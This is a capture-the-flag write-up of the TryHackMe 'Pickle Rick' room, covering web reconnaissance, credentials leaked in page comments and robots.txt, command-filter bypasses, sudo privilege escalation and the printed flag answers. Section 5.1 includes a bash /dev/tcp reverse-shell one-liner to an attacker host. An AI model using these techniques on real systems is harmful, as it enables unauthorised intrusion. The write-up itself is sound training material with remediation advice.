# TryHackMe — Pickle Rick (Easy)

**Author:** Kyle Tawa  
**Date:** June 2026  
**Platform:** [TryHackMe](https://tryhackme.com/room/picklerick)  
**Difficulty:** Easy  
**Category:** Web Exploitation / Privilege Escalation  
**Theme:** Rick and Morty — Help Rick turn himself back from a pickle!

> **Objective:** A Rick and Morty-themed CTF requiring exploitation of a web server to find three secret ingredients (flags) to help Rick make his potion and transform back into a human.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Exploitation](#3-exploitation)
4. [Flags (Ingredients)](#4-flags-ingredients)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Lessons Learned](#6-lessons-learned)

---

## 1. Reconnaissance

### 1.1 Target Identification

The first step was identifying what services were running on the target machine. An `nmap` scan was performed against the target IP address with service version detection and default scripts enabled.

```bash
nmap -sC -sV -Pn -T4 -oA nmap/pickle-rick <TARGET_IP>
```

**Nmap Scan Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Findings:**
- **Port 22 (SSH):** OpenSSH 7.2p2 — key-based authentication only (password auth disabled).
- **Port 80 (HTTP):** Apache 2.4.18 — a web server running on Ubuntu.

No other ports were discovered. The OS fingerprint suggests Ubuntu Xenial (16.04) based on the OpenSSH and Apache versions.

---

## 2. Web Enumeration

### 2.1 Initial Web Page

Navigating to `http://<TARGET_IP>` displayed a static page with the text:

> "Help Morty, Help!"

### 2.2 Source Code Analysis

Viewing the page source revealed a critical disclosure:

```html
<!--
    Note to self, remember username!
    Username: R1ckRul3s
-->
```

This HTML comment leaked a username: **`R1ckRul3s`**. This is a classic CTF convention — developers leaving sensitive notes in comments.

### 2.3 Directory Enumeration

Using `gobuster` (or `ffuf`) with a common wordlist (`raft-large-files.txt` or `common.txt`), directory and file discovery was performed:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html
```

**Findings:**

| Endpoint       | Status | Notes                         |
|----------------|--------|-------------------------------|
| `/robots.txt`  | 200    | Exposes a potential password  |
| `/login.php`   | 200    | Login portal                  |
| `/assets/`     | 200    | Static assets directory       |

### 2.4 robots.txt

Fetching `/robots.txt` returned:

```
Wubbalubbadubdub
```

This is Rick's catchphrase ("Wubba Lubba Dub Dub") — and it functions as the password for the login page.

### 2.5 Login Page

Navigating to `/login.php` presented a username/password form. Using the discovered credentials:

| Field    | Value               |
|----------|---------------------|
| Username | `R1ckRul3s`         |
| Password | `Wubbalubbadubdub`  |

Authentication succeeded, granting access to a restricted web application with a **Command Execution Panel**.

---

## 3. Exploitation

### 3.1 Command Execution Panel

After logging in, the web application presented a panel at the top with navigation links. Attempting to click other links returned a "Sorry, only actual Rick can view this page!" denial message. However, the main **Command** input field allowed direct command execution on the server.

Testing the command execution:

```bash
whoami
```

**Output:** `www-data`

The web application was executing our commands as the `www-data` user via the web server.

### 3.2 Initial Exploration

Listing files in the current directory:

```bash
ls -la
```

**Output revealed a file of interest:**
```
Sup3rS3cretPickl3Ingred.txt
```

Attempting to read it directly with `cat` was blocked by command filtering. Alternative methods were employed:

```bash
# Using less
less Sup3rS3cretPickl3Ingred.txt

# Or using base64 encoding
base64 Sup3rS3cretPickl3Ingred.txt
```

Decoding the base64 output revealed the first ingredient.

### 3.3 Bypassing Command Filters

The web shell appeared to filter some common commands. Effective bypass techniques included:
- Using `base64` to encode file output and then decode locally
- Using `less`, `more`, `head`, `tail` when `cat` was blocked
- Using wildcards and path traversal when `cd` was blocked

### 3.4 Exploring the File System

Listing the `/home` directory revealed a user:

```bash
ls -la /home/
```

**Output:** `rick`

Listing the contents of Rick's home directory:

```bash
ls -la /home/rick/
```

**Output revealed a file:** `second ingredients` — note the space in the filename.

```bash
# Reading the file with base64 bypass
base64 "/home/rick/second ingredients"
```

Decoding the output revealed the second ingredient.

### 3.5 Privilege Enumeration

Checking current user privileges:

```bash
sudo -l
```

**Output:**
```
User www-data may run the following commands on PickleRick:
    (ALL) NOPASSWD: ALL
```

This was a critical misconfiguration — the `www-data` user could run **any command as root** without a password. This is the signature privilege escalation vector of this room.

---

## 4. Flags (Ingredients)

### 4.1 First Ingredient — "mr. meeseek hair"

**Location:** `/var/www/html/Sup3rS3cretPickl3Ingred.txt`

```bash
base64 Sup3rS3cretPickl3Ingred.txt
# Decode: echo "<base64>" | base64 -d
```

> **Ingredient 1:** `mr. meeseek hair`

*A reference to Mr. Meeseeks from the episode "Meeseeks and Destroy" — creatures summoned to complete tasks.*

### 4.2 Second Ingredient — "1 jerry tear"

**Location:** `/home/rick/second ingredients`

```bash
base64 "/home/rick/second ingredients"
# Decode: echo "<base64>" | base64 -d
```

> **Ingredient 2:** `1 jerry tear`

*A reference to Jerry Smith, Rick's son-in-law, whose tears are apparently a potion ingredient. Very on-brand for the show.*

### 4.3 Third Ingredient — "fleeb juice"

**Location:** `/root/3rd.txt` (requires root privileges)

```bash
sudo cat /root/3rd.txt
# or
sudo base64 /root/3rd.txt | base64 -d
```

> **Ingredient 3:** `fleeb juice`

*A reference to the "fleeb" — a fictional creature from the show's anatomy ("What about the fleeb?").*

---

### Flag Summary

| # | Ingredient          | File Path                                      | Access Method     |
|---|---------------------|------------------------------------------------|-------------------|
| 1 | `mr. meeseek hair`  | `/var/www/html/Sup3rS3cretPickl3Ingred.txt`    | Direct read       |
| 2 | `1 jerry tear`      | `/home/rick/second ingredients`                | Directory traversal|
| 3 | `fleeb juice`       | `/root/3rd.txt`                                | `sudo` escalation |

**All three ingredients found — Rick can now make his potion!**

---

## 5. Privilege Escalation

The privilege escalation vector was discovered early via `sudo -l`. The `/etc/sudoers` configuration (or a sudoers.d drop-in) granted the `www-data` user unrestricted sudo access.

```bash
sudo -l
# (ALL) NOPASSWD: ALL
```

This allowed reading the final flag:

```bash
sudo cat /root/3rd.txt
```

**Root access was also achievable:**
```bash
sudo su -
# or
sudo bash -c 'cat /root/3rd.txt'
```

A full root shell could be obtained with:
```bash
sudo /bin/bash
```

This is one of the most permissive sudo configurations possible and represents a severe security misconfiguration.

### 5.1 Alternative: Reverse Shell

For full interactive access, a reverse shell could be established:

```bash
# On attacker machine:
nc -lvnp 4444

# In web shell:
bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
```

> **Note:** Python was not installed on the target, so standard PTY upgrades (`python3 -c 'import pty; pty.spawn("/bin/bash")'`) were unavailable. The `script` command or `stty raw -echo` can assist with TTY management if needed.

---

## 6. Lessons Learned

### 6.1 Key Takeaways

| Lesson | Description |
|--------|-------------|
| **1. Check HTML Comments** | Developers often leak credentials or hints in HTML comments during development. Always inspect page source. |
| **2. robots.txt Is Not Just for Crawlers** | While intended for web crawlers, `robots.txt` can contain sensitive information or even credentials. Always check it. |
| **3. Directory Enumeration Is Essential** | `gobuster`/`ffuf`/`dirsearch` are indispensable for discovering hidden endpoints like `login.php`. Use comprehensive wordlists. |
| **4. Command Injection via Web Shells** | Web-based command execution panels are often poorly secured. Always test with `id` or `whoami` first. |
| **5. Bypass Techniques Matter** | When `cat` or other commands are blocked, alternatives like `base64`, `less`, `more`, `head`, `tail`, or `egrep` can work. |
| **6. Always Check `sudo -l`** | This single command reveals privilege escalation opportunities. The `(ALL) NOPASSWD: ALL` misconfiguration is a goldmine. |
| **7. Check for Spaces in Filenames** | The second ingredient file had a space in its name (`second ingredients`). Use quotes or tab-completion to handle these. |

### 6.2 Remediation Recommendations (Defensive Perspective)

1. **Never hardcode credentials** in HTML comments or source code.
2. **Restrict `robots.txt`** from exposing sensitive paths or data.
3. **Sanitize command input** — never pass user-supplied data directly to system command execution functions.
4. **Apply the principle of least privilege** to sudoers — `www-data` should never have `(ALL) NOPASSWD: ALL`.
5. **Use Web Application Firewalls (WAF)** and input validation to block command injection attacks.
6. **Regularly audit file permissions** — sensitive files should not be world-readable.

### 6.3 Tools Used

| Tool        | Purpose                              |
|-------------|--------------------------------------|
| `nmap`      | Port scanning and service detection  |
| `gobuster`  | Web directory/file enumeration       |
| `curl`      | HTTP requests and web interaction    |
| `base64`    | Bypassing command filtering          |
| `sudo -l`   | Privilege escalation check           |

---

## Final Thoughts

The Pickle Rick room is an excellent beginner-friendly CTF that covers the core phases of a web penetration test: reconnaissance, enumeration, exploitation, and privilege escalation. While rated "Easy," it reinforces essential techniques such as source code review, directory fuzzing, command injection, and sudo misconfiguration abuse — all in a fun, themed package.

*wubba-lubba-dub-dub!*

---

*This write-up is part of my cybersecurity portfolio. For questions or collaboration, feel free to reach out via [GitHub](https://github.com/kyletawa).*